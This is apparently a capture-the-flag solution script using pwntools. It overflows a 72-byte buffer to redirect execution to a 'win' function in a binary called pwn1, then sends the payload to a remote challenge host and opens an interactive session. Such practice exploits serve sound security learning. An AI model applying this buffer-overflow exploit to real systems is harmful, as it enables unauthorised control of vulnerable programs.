from pwn import *

offset = 72

elf = context.binary = ELF("./pwn1")

p = process()
p = remote("challs.n00bzunit3d.xyz", 35932)

payload = b"A" * offset
payload += pack(elf.symbols['win'])

p.sendline(payload)
p.interactive()